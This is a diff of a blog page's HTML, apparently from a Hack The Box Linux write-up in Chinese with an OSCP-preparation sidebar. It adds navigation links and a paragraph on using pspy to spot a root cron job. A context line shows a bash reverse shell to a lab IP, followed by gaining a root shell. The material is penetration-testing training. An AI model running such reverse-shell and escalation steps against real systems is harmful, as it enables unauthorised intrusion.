@@ -62,6 +62,11 @@ document.addEventListener('DOMContentLoaded', function () {
 <h1 id="November-4-2020">November 4, 2020</h1>
 <h1 id="写点啥儿">写点啥儿</h1>
 <h1 id="">-</h1>
+<h1 id="WEAPONRY"><strong>[ WEAPONRY ]</strong></h1>
+<ul>
+<li><a href="/weaponry/kali/KALI-Deploy">KALI Deploy</a></li>
+<li><a href="/weaponry/kali/Common-Problems">Common Problems</a></li>
+</ul>
 <h1 id="-v2">-</h1>
 <h1 id="OSCP-BATTLE"><strong>[ OSCP BATTLE ]</strong></h1>
 <ul>
@@ -69,7 +74,6 @@ document.addEventListener('DOMContentLoaded', function () {
 </ul>
 <h2 id="Prepration">Prepration</h2>
 <ul>
-<li><a href="/oscp/KALI-Deploy">KALI Deploy</a></li>
 <li><a href="/oscp/Training-Plan">Training Plan</a></li>
 </ul>
 <h2 id="Note">Note</h2>
@@ -88,6 +92,8 @@ document.addEventListener('DOMContentLoaded', function () {
 <li><a href="/htb/htb-linux/Lame-Writeup">Lame Writeup</a></li>
 <li><a href="/htb/htb-linux/Shocker-Writeup">Shocker Writeup</a></li>
 <li><a href="/htb/htb-linux/Bashed-Writeup">Bashed Writeup</a></li>
+<li><a href="/htb/htb-linux/Beep-Writeup">Beep Writeup</a></li>
+<li><a href="/htb/htb-linux/Nibbles-Writeup">Nibbles Writeup</a></li>
 </ul>
 <h2 id="HTB-Windows">HTB Windows</h2>
 <ul>
@@ -228,7 +234,12 @@ nohup bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1</p>
 果不其然得到一个 root shell。</p>
 <p><img src="./12.png" alt=""></p>
 <blockquote>
-<p>事后查看计划任务，确实。</p>
+<p>这里的正确思路是：<br>
+<strong>使用普通用户监控 root-crontab 的工具：pspy</strong><br>
+上传至靶机，赋权 <code>chmod 777 pspy64s</code>，执行 <code>./pspy64s</code>，观察日志，会发现定时任务明细内容。</p>
+<p><img src="./17.png" alt=""><br>
+<img src="./16.png" alt=""><br>
+提权后查看计划任务，确实。</p>
 <p><img src="./15.png" alt=""></p>
 </blockquote>
 <h2 id="0x04-攻击节点">0x04 攻击节点</h2>
